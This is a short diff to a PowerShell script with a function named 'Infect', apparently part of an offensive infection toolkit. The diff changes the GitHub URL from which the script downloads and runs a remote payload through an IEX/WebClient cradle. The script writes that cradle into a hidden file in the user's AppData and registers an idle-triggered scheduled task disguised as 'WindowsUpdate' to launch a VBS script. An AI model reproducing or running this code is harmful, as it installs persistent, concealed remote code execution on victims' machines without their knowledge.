@@ -2,7 +2,7 @@ Function Infect
 {
   
 New-Item $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt -type file -force
-Add-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt "IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/test/master/Infection.ps1')); FetchCommands -Force"
+Add-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt "IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Powershell-Infection/master/Infection.ps1')); FetchCommands -Force"
 Set-ItemProperty -Path $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\config.txt -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 schtasks /create  /TN WindowsUpdate /TR 'C:\Windows\System32\WScript.exe //Nologo //B C:\Microsoft\Windows\Desktop\Initialize.vbs' /sc onidle /i 20
 New-Item 'C:\Microsoft\Windows\Desktop\Initialize.txt' -type file -force
